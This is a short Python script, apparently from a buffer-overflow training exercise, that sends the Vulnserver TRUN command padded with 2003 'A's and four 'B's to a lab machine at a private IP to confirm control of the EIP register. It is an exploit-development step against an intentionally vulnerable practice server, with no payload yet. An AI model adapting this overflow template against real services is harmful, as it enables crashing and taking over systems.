#!/usr/bin/python
import sys, socket

shellcode = "A" * 2003 + "B" * 4 #overwrite everything with A's(41), except for the EIP, we overwrite it with B's(42)

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.1.20', 9999)) #IP of the windows machine running Vulnserver and port number
        s.send(('TRUN /.:/' + shellcode))
        s.close()
                        
except:
        print "Error connecting to the server!!"
        sys.exit()    